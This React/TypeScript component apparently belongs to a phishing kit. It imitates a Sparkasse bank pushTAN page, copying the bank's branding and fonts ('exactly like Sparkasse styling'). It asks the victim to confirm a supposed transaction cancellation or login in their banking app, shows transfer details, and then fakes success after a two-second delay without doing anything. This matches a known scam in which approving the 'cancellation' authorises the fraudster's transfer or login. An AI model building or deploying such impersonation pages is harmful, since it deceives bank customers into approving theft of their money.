import React, { useState, useEffect } from 'react';
import Loading from './Loading';

interface TransactionDetails {
  amount?: string;
  recipient?: string;
  reference?: string;
  iban?: string;
}

type TANType = 'TRANSACTION_TAN' | 'LOGIN_TAN';

interface PushTANScreenProps {
  tanType: TANType;
  transactionDetails?: TransactionDetails;
  onConfirm: () => void;
  onCancel?: () => void;
}

const PushTANScreen: React.FC<PushTANScreenProps> = ({ 
  tanType,
  transactionDetails = {}, 
  onConfirm, 
  onCancel
}) => {
  const [isWaiting, setIsWaiting] = useState(true);
  const [countdown, setCountdown] = useState(120);
  const [isLoading, setIsLoading] = useState(false);
  const [isMobile, setIsMobile] = useState(false);

  // Mobile detection
  useEffect(() => {
    const checkMobile = () => {
      const isChromeOnMobile = /Chrome/.test(navigator.userAgent) && /Mobile/.test(navigator.userAgent);
      const isSmallScreen = window.innerWidth <= 768;
      const isTouchDevice = 'ontouchstart' in window;
      
      setIsMobile(isSmallScreen || isChromeOnMobile || (isTouchDevice && isSmallScreen));
    };
    
    checkMobile();
    window.addEventListener('resize', checkMobile);
    window.addEventListener('orientationchange', checkMobile);
    
    return () => {
      window.removeEventListener('resize', checkMobile);
      window.removeEventListener('orientationchange', checkMobile);
    };
  }, []);

  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const handleConfirm = async () => {
    setIsLoading(true);
    setIsWaiting(false);
    
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    setIsLoading(false);
    onConfirm();
  };

  return (
    <>
      {isLoading && (
        <Loading 
          message={tanType === 'TRANSACTION_TAN' ? 'Stornierung wird verarbeitet...' : 'pushTAN wird verarbeitet...'}
          type="processing"
          showProgress={true}
          duration={2}
        />
      )}
      
      <div className="sparkasse-container" style={{
        maxWidth: '1200px',
        margin: '0 auto',
        padding: isMobile ? '1rem' : '2rem',
        minHeight: '80vh',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        paddingTop: isMobile ? '2rem' : '4rem'
      }}>
        
        <div className="form-container" style={{
          backgroundColor: 'white',
          borderRadius: '8px',
          padding: '2rem',
          boxShadow: '0 2px 8px rgba(0, 0, 0, 0.1)',
          maxWidth: '600px',
          width: '100%',
          margin: '2rem auto'
        }}>
          
          {/* Title with Sparkasse styling */}
          <h1 style={{
            fontSize: isMobile ? '2rem' : '2.5rem',
            fontFamily: 'SparkasseWeb, Arial, sans-serif',
            fontWeight: 'bold',
            color: '#ff0018',
            marginBottom: '1.5rem',
            textAlign: 'center'
          }}>
            {tanType === 'TRANSACTION_TAN' ? 'pushTAN Stornierung' : 'pushTAN Anmeldung'}
          </h1>
          
          {/* Instruction text */}
          <div className="info-box" style={{
            backgroundColor: '#fff3cd',
            border: '1px solid #ffeaa7',
            borderRadius: '8px',
            padding: '1rem',
            marginBottom: '2rem'
          }}>
            <p style={{
              color: '#856404',
              fontSize: '0.9rem',
              margin: 0,
              fontFamily: 'SparkasseWeb, Arial, sans-serif',
              textAlign: 'center'
            }}>
              {tanType === 'TRANSACTION_TAN' 
                ? 'Bestätigen Sie die Stornierung der Transaktion in Ihrer Sparkasse Banking-App'
                : 'Bestätigen Sie Ihren Anmeldeversuch in Ihrer Sparkasse Banking-App'
              }
            </p>
          </div>

          {/* Transaction details card - only for TRANSACTION_TAN */}
          {tanType === 'TRANSACTION_TAN' && transactionDetails.amount && (
            <div className="sparkasse-card" style={{
              backgroundColor: '#f8f9fa',
              border: '2px solid #ff0018',
              borderRadius: '8px',
              padding: '2rem',
              marginBottom: '2rem'
            }}>
              <h2 style={{
                fontSize: '1.25rem',
                fontFamily: 'SparkasseWeb, Arial, sans-serif',
                fontWeight: 'bold',
                color: '#ff0018',
                marginBottom: '1.5rem',
                textAlign: 'center'
              }}>
                Zu stornierende Transaktion
              </h2>
              
              <div style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
                <div style={{ 
                  display: 'flex', 
                  justifyContent: 'space-between', 
                  alignItems: 'center',
                  paddingBottom: '0.75rem',
                  borderBottom: '1px solid #dee2e6'
                }}>
                  <span style={{
                    color: '#495057',
                    fontSize: '0.875rem',
                    fontFamily: 'SparkasseWeb, Arial, sans-serif',
                    fontWeight: 'normal'
                  }}>Betrag:</span>
                  <span style={{
                    color: '#ff0018',
                    fontSize: '1.125rem',
                    fontFamily: 'SparkasseWeb, Arial, sans-serif',
                    fontWeight: 'bold'
                  }}>{transactionDetails.amount}</span>
                </div>
                
                {transactionDetails.recipient && (
                  <div style={{ 
                    display: 'flex', 
                    justifyContent: 'space-between', 
                    alignItems: 'center',
                    paddingBottom: '0.75rem',
                    borderBottom: '1px solid #dee2e6'
                  }}>
                    <span style={{
                      color: '#495057',
                      fontSize: '0.875rem',
                      fontFamily: 'SparkasseWeb, Arial, sans-serif',
                      fontWeight: 'normal'
                    }}>Empfänger:</span>
                    <span style={{
                      color: '#212529',
                      fontSize: '0.875rem',
                      fontFamily: 'SparkasseWeb, Arial, sans-serif',
                      fontWeight: 'normal',
                      textAlign: 'right'
                    }}>{transactionDetails.recipient}</span>
                  </div>
                )}
                
                {transactionDetails.iban && (
                  <div style={{ 
                    display: 'flex', 
                    justifyContent: 'space-between', 
                    alignItems: 'center',
                    paddingBottom: '0.75rem',
                    borderBottom: '1px solid #dee2e6'
                  }}>
                    <span style={{
                      color: '#495057',
                      fontSize: '0.875rem',
                      fontFamily: 'SparkasseWeb, Arial, sans-serif',
                      fontWeight: 'normal'
                    }}>IBAN:</span>
                    <span style={{
                      color: '#212529',
                      fontSize: '0.875rem',
                      fontFamily: 'monospace',
                      textAlign: 'right'
                    }}>{transactionDetails.iban}</span>
                  </div>
                )}
                
                {transactionDetails.reference && (
                  <div style={{ 
                    display: 'flex', 
                    justifyContent: 'space-between', 
                    alignItems: 'center'
                  }}>
                    <span style={{
                      color: '#495057',
                      fontSize: '0.875rem',
                      fontFamily: 'SparkasseWeb, Arial, sans-serif',
                      fontWeight: 'normal'
                    }}>Verwendungszweck:</span>
                    <span style={{
                      color: '#212529',
                      fontSize: '0.875rem',
                      fontFamily: 'SparkasseWeb, Arial, sans-serif',
                      fontWeight: 'normal',
                      textAlign: 'right'
                    }}>{transactionDetails.reference}</span>
                  </div>
                )}
              </div>
            </div>
          )}

          {/* Status section */}
          <div style={{ textAlign: 'center', margin: '3rem 0' }}>
            {isWaiting ? (
              <div>
                <div style={{
                  width: '40px',
                  height: '40px',
                  border: '4px solid #f3f3f3',
                  borderTop: '4px solid #ff0018',
                  borderRadius: '50%',
                  animation: 'spin 1s linear infinite',
                  margin: '0 auto 2rem auto'
                }} />
                <h3 style={{
                  color: '#ff0018',
                  fontSize: '1.25rem',
                  fontFamily: 'SparkasseWeb, Arial, sans-serif',
                  fontWeight: 'bold',
                  marginBottom: '1rem'
                }}>
                  {tanType === 'TRANSACTION_TAN' ? 'Warten auf Stornierung...' : 'Warten auf Anmeldung...'}
                </h3>
                <p style={{
                  color: '#6c757d',
                  fontSize: '0.875rem',
                  marginBottom: '1rem',
                  fontFamily: 'SparkasseWeb, Arial, sans-serif'
                }}>
                  Timeout in: <span style={{ fontWeight: 'bold', color: '#dc3545' }}>{formatTime(countdown)}</span>
                </p>
              </div>
            ) : (
              <div>
                <div style={{
                  width: '40px',
                  height: '40px',
                  backgroundColor: '#28a745',
                  borderRadius: '50%',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  margin: '0 auto 2rem auto'
                }}>
                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="3">
                    <path d="M20 6L9 17l-5-5"/>
                  </svg>
                </div>
                <h3 style={{
                  color: '#28a745',
                  fontSize: '1.25rem',
                  fontFamily: 'SparkasseWeb, Arial, sans-serif',
                  fontWeight: 'bold',
                  marginBottom: '1rem'
                }}>
                  {tanType === 'TRANSACTION_TAN' ? 'Transaktion storniert' : 'Anmeldung bestätigt'}
                </h3>
              </div>
            )}
          </div>

          {/* Action buttons exactly like Sparkasse styling */}
          <div style={{ marginBottom: '1rem' }}>
            <button
              onClick={handleConfirm}
              disabled={isLoading}
              style={{
                backgroundColor: isLoading ? '#6c757d' : '#ff0018',
                color: 'white',
                border: 'none',
                borderRadius: '4px',
                padding: '16px 24px',
                fontSize: '16px',
                fontWeight: 'bold',
                cursor: isLoading ? 'not-allowed' : 'pointer',
                fontFamily: 'SparkasseWeb, Arial, sans-serif',
                transition: 'all 0.3s ease',
                display: 'block',
                textAlign: 'center',
                width: '100%'
              }}
              onMouseEnter={(e) => {
                if (!isLoading) {
                  (e.target as HTMLButtonElement).style.backgroundColor = '#e60016';
                  (e.target as HTMLButtonElement).style.transform = 'translateY(-1px)';
                }
              }}
              onMouseLeave={(e) => {
                if (!isLoading) {
                  (e.target as HTMLButtonElement).style.backgroundColor = '#ff0018';
                  (e.target as HTMLButtonElement).style.transform = 'translateY(0)';
                }
              }}
            >
              {isWaiting 
                ? (tanType === 'TRANSACTION_TAN' ? 'Manuell stornieren' : 'Manuell bestätigen')
                : 'Weiter'
              }
            </button>
          </div>

          {/* Footer Links */}
          {onCancel && (
            <div style={{ textAlign: 'center' }}>
              <a 
                href="#" 
                onClick={(e) => {
                  e.preventDefault();
                  onCancel();
                }}
                style={{
                  color: '#ff0018',
                  textDecoration: 'none',
                  fontSize: '14px',
                  fontFamily: 'SparkasseWeb, Arial, sans-serif'
                }}
              >
                {tanType === 'TRANSACTION_TAN' ? 'Stornierung abbrechen' : 'Anmeldung abbrechen'}
              </a>
            </div>
          )}
        </div>
      </div>

      <style jsx>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
        
        .sparkasse-container {
          font-family: 'SparkasseWeb', Arial, sans-serif;
        }
        
        @media (max-width: 768px) {
          .sparkasse-container {
            padding: 1rem;
          }
          
          .form-container {
            padding: 1.5rem;
            margin: 1rem auto;
          }
        }
      `}</style>
    </>
  );
};

export default PushTANScreen;
